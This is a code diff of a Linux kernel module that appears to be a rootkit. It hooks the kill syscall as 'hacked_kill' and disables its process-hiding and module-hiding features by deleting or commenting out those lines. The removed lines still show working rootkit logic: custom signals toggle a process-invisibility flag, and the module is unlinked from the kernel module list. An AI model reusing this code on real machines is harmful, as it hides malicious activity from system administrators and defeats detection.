@@ -283,58 +283,27 @@ tidy(void)
 	THIS_MODULE->sect_attrs = NULL;
 }
 
-static struct list_head *module_previous;
+// static struct list_head *module_previous;
 static short module_hidden = 0;
 void
 module_show(void)
 {
-	list_add(&THIS_MODULE->list, module_previous);
+	// list_add(&THIS_MODULE->list, module_previous);
 	module_hidden = 0;
 }
 
 void
 module_hide(void)
 {
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
+	// module_previous = THIS_MODULE->list.prev;
+	// list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage int
 hacked_kill(const struct pt_regs *pt_regs)
 {
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	pid_t pid = (pid_t) pt_regs->di;
-	int sig = (int) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	pid_t pid = (pid_t) pt_regs->regs[0];
-	int sig = (int) pt_regs->regs[1];
-#endif
-#else
-asmlinkage int
-hacked_kill(pid_t pid, int sig)
-{
-#endif
-	struct task_struct *task;
-	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
-			break;
-		default:
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-			return orig_kill(pt_regs);
-#else
-			return orig_kill(pid, sig);
-#endif
-	}
-	return 0;
+	return orig_kill(pt_regs);
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -395,7 +364,7 @@ kprobemod_init(void)
 	init_begin = (unsigned long)lookup_name("__init_begin");
 #endif
 
-	module_hide();
+	// module_hide();
 	tidy();
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
